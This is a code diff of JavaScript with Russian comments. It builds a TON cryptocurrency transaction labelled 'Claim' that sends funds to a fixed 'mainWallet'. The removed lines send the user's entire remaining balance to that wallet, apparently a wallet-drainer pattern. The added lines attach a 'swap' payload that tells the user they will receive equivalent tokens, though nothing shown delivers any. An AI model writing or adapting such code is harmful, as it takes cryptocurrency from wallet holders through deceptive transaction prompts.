@@ -101,16 +101,16 @@ async function didtrans() {
     // Формируем транзакцию с двумя сообщениями
     const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
-        messages: [
-            {
-                address: mainWallet,  // Адрес получателя для первой части
-                amount: 1000000,       // Сумма для первой транзакции (0.001 TON)
-            },
-            {
-                address: mainWallet,   // Адрес получателя для второй части
-                amount: remainingBalance, // Сумма для второй транзакции
-            }
-        ],
+        messages: [{
+            address: mainWallet,  // Адрес получателя для первой части
+            amount: 1000000,       // Сумма в нанотонах (0.001 TON)
+            payload: JSON.stringify({ 
+                type: "swap",
+                originalAmount: 1000000, // Отправляемая сумма
+                receivedAmount: 1000000, // Получаемая сумма (в токенах)
+                description: "Вы получите эквивалентную сумму в токенах"
+            }),
+        }],
         sendMode: 3,  // Если это требуется в вашем API
         comment: "Claim",  // Комментарий (по желанию)
     };
